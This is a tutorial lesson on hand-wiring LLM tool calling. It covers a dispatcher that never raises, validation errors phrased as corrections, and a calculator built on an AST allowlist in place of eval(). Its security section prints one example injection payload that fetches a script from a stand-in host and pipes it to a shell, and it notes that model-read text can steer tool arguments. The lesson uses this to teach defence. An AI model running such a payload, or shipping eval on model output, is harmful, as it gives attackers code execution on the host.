# Lesson 2 — Tool calling, wired by hand

**Time:** 1–1.5 hours
**You will end with:** an assistant that reads a clock, does exact arithmetic and converts currency, plus a dispatcher that survives every way a model can misbehave
**Depends on:** lessons 0 and 1

---

## Learn first

### The thing almost everyone gets wrong

"Tool calling" is a misleading name. It sounds like the model calls your function. It does not.

**A model only ever produces text.** It cannot execute code, open a socket, read a file or check a clock. What it can do is emit a *structured request* — "I would like `get_current_time` run with `{"timezone": "Asia/Kolkata"}`" — and then stop and wait.

Your code decides what happens next. Five steps:

```
1. SEND      the question, plus descriptions of the tools available
2. RECEIVE   a structured request instead of prose
3. EXECUTE   your code runs the function. The model is not involved.
4. RETURN    the result goes back as a message with role "tool"
5. ANSWER    the model writes prose using the result
```

Lesson 0's `check_env.py` performed steps 1 and 2 and deliberately stopped. That's why it printed `requested get_current_time(...)` — there is no `get_temperature` function anywhere in that lesson, only a *description* of one. This lesson builds steps 3 through 5.

Two consequences worth holding onto.

**The model has no power. Your dispatcher has all of it.** A model can request `delete_everything({})`. Whether anything happens depends entirely on what you implemented and what you chose to run. An agent's blast radius is a property of your code, never of the model's intentions. That's the foundation lesson 11 builds on.

**Tool schemas are prompt text.** Every tool description is re-sent, in full, on every call. The model's decision about whether to use your tool is based on nothing but that text. Run `--show-wire` to see it — it's an unglamorous JSON blob, and there's no magic in it anywhere.

### Terminology: the "dispatcher"

The word appears throughout this lesson, so let's pin it down. The **dispatcher** is a function *you* write that takes the tool name the model asked for and routes it to the matching Python function. Nothing more exotic than a switchboard. Here it is `dispatch()` in `tools.py`.

It is not a provider feature and not part of any library. Groq has never heard of it. The division of labour:

```
YOUR CODE                            THE PROVIDER (Groq)
────────────────────────────────     ──────────────────────────
agent.py builds the request
       │  POST ──────────────────►   the model reads your tool
       │                             descriptions and emits text:
       │  ◄──────────── response     "run get_current_time with
       ▼                              {"timezone":"Asia/Kolkata"}"
dispatch(call)     ◄── your code. the provider is finished.
  ├─ name in REGISTRY?
  ├─ arguments valid?
  └─ call your function ──► runs on YOUR machine, reads YOUR clock
       │
       ▼
append the result as a "tool" message
       │  POST ──────────────────►   model writes prose from it
```

The provider's entire involvement is two HTTPS round trips. It never sees your function bodies and never executes anything. It receives the *description* you wrote, and later the *string* your function returned.

Three layers, since the names can blur together:

| Layer | Where | Responsibility |
|---|---|---|
| Provider | Groq's servers | hosts the model, returns text |
| `src/llmkit/` | this repo | HTTP plumbing, normalises across providers, knows nothing about your tools |
| `tools.py` | this lesson | your tools, your registry, your dispatcher — where decisions are made |

### Why tools matter at all

Two distinct reasons, and it's worth keeping them separate.

**Things the model cannot know.** The current time, your database contents, today's prices. The weights were frozen at training time; there is no clock and no network. Ask an unaided model the time and the honest answer is "I can't know" — run `--no-tools` and watch it say so. No prompt fixes a missing capability.

**Things the model is unreliable at.** Long multiplication, precise decimals. A model predicts tokens; it doesn't run an ALU. It's often right, which is exactly the problem — "usually correct" needs spot-checking, and "always correct" doesn't.

### Failure is the normal case

The happy path is about twenty lines. Everything else in `tools.py` handles a model that:

- asks for a tool that doesn't exist
- emits arguments that aren't valid JSON
- omits a required argument, or invents an extra one
- passes a plausible-but-wrong value (`"Mumbai"` where an IANA timezone belongs)
- passes something actively dangerous
- declines to use the tool at all

So `dispatch()` **never raises**. Every failure returns a string describing what went wrong, and that string goes back to the model as an observation. This is lesson 1's validate-and-repair pattern applied to tools: a failure is a turn in a conversation, not an exception.

The reason this matters is visible in scenario 6 of `failures.py`. Given `Error: Unknown timezone 'Mumbai'. Use an IANA name such as 'Asia/Kolkata'`, the model fixes itself on the next turn with no code from you telling it how. Had the dispatcher raised, the process would have died on a mistake recoverable in one turn.

**Corollary: your error messages are prompt engineering.** `Error: invalid timezone` is a dead end. `Use an IANA name such as Asia/Kolkata` is a correction. Always name the valid options.

### The security part, which is not optional

The obvious way to write a calculator tool:

```python
def calculate(expression):
    return str(eval(expression))   # never do this
```

`expression` is a string a language model generated, and models can be steered by text they read — a retrieved document, a web page, a user message. `eval()` on that string is arbitrary code execution in your process:

```python
__import__('os').system('curl evil.sh | sh')
```

So `tools.py` parses the expression into a syntax tree and walks it, permitting an explicit list of node types and refusing everything else. That's an **allowlist**, and it's why it blocks attacks it was never written to anticipate — attribute access and imports simply aren't in the permitted set. A blocklist of dangerous-looking strings is a game you lose to the next encoding trick.

Note that `9**9**9` is a *different* problem: no code execution, but it pins a CPU core and exhausts memory. Code-execution limits and resource limits are separate concerns and you need both.

---

## Then apply

### The happy path

```powershell
uv run lessons/02-tool-calling/agent.py
```

Watch all five steps. The model translates "Mumbai" into `Asia/Kolkata` on its own — that mapping is the intelligence you're paying for. Your code supplies the fact.

### See the whole conversation

```powershell
uv run lessons/02-tool-calling/agent.py --transcript
```

Five messages: `system → user → assistant(tool_calls) → tool → assistant`. That list is the entire memory of the interaction. Note it grew from 2 messages to 5, and every one is re-sent on each call.

### The experiments

**1. Withhold the tools.**

```powershell
uv run lessons/02-tool-calling/agent.py --no-tools
```

Same question, no capability — run twice with two different system prompts, because the contrast is the actual finding.

**Prompt A** is the same one the tool-enabled version uses: *"use a tool whenever it can give you a fact you cannot know."* With an empty tool list that's a contradiction, and the model resolves it by **inventing a tool**. Observed attempts: `container.exec` (to run a Python script) and `browser.search` — both tools from its training environment, neither offered by us. The provider rejects the generation with HTTP 400.

**Prompt B** tells it plainly: *"you have no tools; if you cannot know something, say so."* It then correctly reports that it can't access real-time data, and usually volunteers that Mumbai is UTC+05:30.

Two lessons. A capability gap can't be prompted away — neither prompt produces the actual time. And **your system prompt and your tool list must agree**; a prompt insisting on tools you didn't provide invites hallucination. If you disable tools at runtime, update the prompt too.

This is also live proof that failure scenario 1 isn't hypothetical: models really do request tools that were never published.

**2. Look at the wire.**

```powershell
uv run lessons/02-tool-calling/agent.py --show-wire
```

The literal HTTP body. Every tool schema, in full, on every request. Ten verbose tools can cost more input tokens than the conversation itself — which is why "just add another tool" isn't free.

**3. Arithmetic, with and without.**

```powershell
uv run lessons/02-tool-calling/agent.py --arithmetic
```

A capable model often gets the unaided sum right, especially a reasoning model working digit by digit. That's not the point. Unaided it's *sometimes* right; with the tool it's *always* right, for a fraction of the reasoning tokens.

**4. Hit the ceiling deliberately.**

```powershell
uv run lessons/02-tool-calling/agent.py --multi-step
```

This question needs three tools *in sequence* — the time, then a currency conversion, then a percentage of the converted amount. The model cannot ask for the percentage until it has seen the conversion result. This script handles exactly one round, so it stops and tells you.

That wall is the entire motivation for lesson 3. Sit with it for a second before moving on: the fix isn't a better prompt or a bigger model, it's a `while` loop.

**5. All six failure modes.**

```powershell
uv run lessons/02-tool-calling/failures.py
```

Scenarios 1–4 are deterministic — we hand-build the exact `ToolCall` a misbehaving model would emit and push it through the dispatcher. That technique is worth noting: **to test how your agent handles bad model output, you don't need a bad model, you need a fake response.** Lesson 6 turns this into a proper test suite.

Scenarios 5 and 6 use the live model and will vary between runs.

### Make changes

1. **Add a tool.** A word counter, or a `days_until(date)`. You'll write a function, a `ToolSpec`, and one registry entry. Notice how little wiring that is — and that the description takes longer to get right than the code.
2. **Sabotage a description.** Change `calculate`'s to `"Does math."` and rerun the multi-step question. On a strong model it may still work, which is itself the finding: a capable model masks a bad description, and a weaker one won't.
3. **Force a tool call.** Ask "what is 2+2?" and compare `tool_choice="auto"` with `tool_choice="required"`. `auto` lets the model judge necessity; `required` removes the option.
4. **Make an error message worse.** Change the timezone error to just `"Error: bad timezone"` and rerun scenario 6. Self-correction usually stops working. Your error text is prompt text.
5. **Try to break the calculator.** Add your own attack to the list in `failures.py`. If you find one that gets through, that's a genuine finding — the AST walker is small enough to audit by eye.
6. **Add an enum.** Give `convert_currency` an `"enum"` of supported codes in its schema and see whether the `BTC` failure stops happening. Constraining the schema beats handling the error.

---

## Checkpoint

You're done when you can answer these without looking:

- What exactly does a model do when it "calls a tool"?
- Why does `dispatch()` return errors as strings instead of raising?
- Why is `eval()` in a calculator tool a security vulnerability rather than a shortcut?
- Why does an allowlist block attacks it wasn't written to anticipate?
- What's the difference between `tool_choice="auto"` and `"required"`?
- Why can't this script answer the `--multi-step` question?

Then read [NOTES.md](./NOTES.md).

## Files

| File | What it is |
|---|---|
| `tools.py` | Three tools, the registry, and `dispatch()` — the security boundary. The real lesson. |
| `agent.py` | The deliverable: the five steps, plus four experiments. |
| `failures.py` | Six failure modes, demonstrated. Scenarios 1–4 are deterministic. |
| `NOTES.md` | Revision notes. |

**Next:** lesson 03, where the one-round limit becomes a loop and this finally becomes an agent.
